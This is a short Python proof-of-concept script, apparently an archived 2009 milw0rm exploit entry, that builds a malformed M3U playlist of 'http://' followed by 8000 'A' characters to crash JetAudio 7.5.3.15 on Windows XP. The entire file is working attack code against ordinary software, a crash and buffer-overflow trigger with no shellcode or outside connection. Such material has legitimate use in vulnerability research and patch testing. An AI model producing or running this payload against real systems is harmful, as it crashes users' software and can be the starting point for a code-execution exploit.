#!/usr/bin/env python

###########################################################################################
#
# JetAudio 7.5.3.15 Local Crash PoC
# Found By: Dr_IDE
# Download: http://www.cowonamerica.com/download/
# Tested on Windows XP SP2
# 
############################################################################################

# Crash occurs in msvcr90.dll which is included with this version of the program.


buff = ("http://" + "\x41" * 8000);

print " [-] Creating payload.";

f1 = open('JA_7.5.3.15.M3U','w');
f1.write(buff);
f1.close();

print " [-] File created successfully.";

# milw0rm.com [2009-08-06]
